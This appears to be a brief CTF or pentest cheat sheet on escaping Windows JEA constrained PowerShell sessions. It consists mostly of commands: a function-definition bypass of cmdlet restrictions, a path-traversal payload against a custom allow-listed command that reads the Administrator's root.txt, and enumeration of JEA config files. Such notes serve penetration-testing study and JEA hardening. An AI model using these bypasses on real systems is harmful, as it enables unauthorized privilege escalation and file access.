# JEA (Just Enough Administration) Escape

WinRM session constrained to specific cmdlets. Check language mode:
```powershell
$ExecutionContext.SessionState.LanguageMode   # → ConstrainedLanguage
Get-Command   # lists allowed commands only
```

**Bypass via function definition:**
```powershell
function gl { Get-Location }; gl
function gi { Get-Item $args[0] }; gi C:\Users\Administrator
```
If `ConstrainedLanguage` still blocks, try `NoLanguage` sessions with custom commands.

**Custom JEA command path traversal:**
If a custom function like `Check-File` is defined with a path allow-list, check if it uses `Get-Content` on a path you control:
```powershell
# If Check-File only allows D:\ and C:\ProgramData\
Check-File -Path 'C:\ProgramData\..\Users\Administrator\Desktop\root.txt'
```

**Enumerate JEA config files:**
```powershell
ls C:\Windows\System32\WindowsPowerShell\v1.0\Modules\
ls C:\Program Files\WindowsPowerShell\
# .psrc files define what's allowed
```
